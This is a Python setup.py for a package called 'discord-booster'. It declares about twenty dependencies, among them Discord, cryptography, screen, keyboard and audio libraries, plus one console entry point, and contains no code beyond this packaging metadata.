from setuptools import setup, find_packages

setup(
    name="discord-booster",
    version="0.3",
    packages=find_packages(),
    install_requires=[
        "discord.py",
        "aiohttp",
        "pycryptodome",
        "requests",
        "opencv-python",
        "pycaw",
        "comtypes",
        "pyautogui",
        "pyttsx3",
        "numpy",
        "keyboard",
        "sounddevice",
        "scipy",
        "cryptography",
        "psutil",
        "GPUtil",
        "screeninfo",
        "pypresence",
        "pywin32",
        "colorama",
        "rotate-screen"
    ],
    entry_points={
        'console_scripts': [
            'discord_booster=discord_booster:main',
        ],
    },
)
